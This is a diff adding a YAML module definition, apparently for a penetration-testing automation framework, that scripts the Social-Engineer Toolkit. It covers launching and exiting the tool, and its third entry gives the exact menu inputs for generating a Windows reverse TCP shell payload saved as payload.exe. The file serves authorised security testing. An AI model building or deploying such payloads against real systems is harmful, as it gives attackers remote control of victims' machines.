@@ -1,0 +1,38 @@
+---
+name: Social-Engineer Toolkit (SET)
+description: Open-source penetration testing framework designed for social engineering
+os: Linux
+ptf_module: modules/exploitation/setoolkit
+---
+commands:
+  - "Launch SET":
+    - type: ["bash","interactive"]
+    - text:
+      - "setoolkit"
+      - "y"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"setoolkit"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Exit SET":
+    - type: ["setoolkit","interactive"]
+    - text: "exit"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"bash"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Generate Windows Reverse TCP Shell Payload":
+    - type: ["setoolkit","interactive"]
+    - text:
+      - "1"
+      - "4"
+      - "1"
+      - "{IPV4}"
+      - "{INT}"
+      - "no"
+      - ""
+    - input: ["local IPv4 address","local port"]
+    - output: ["STDOUT",{"PROMPT":"setoolkit"},{"FILE":{"string":"~/.set/payload.exe"}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
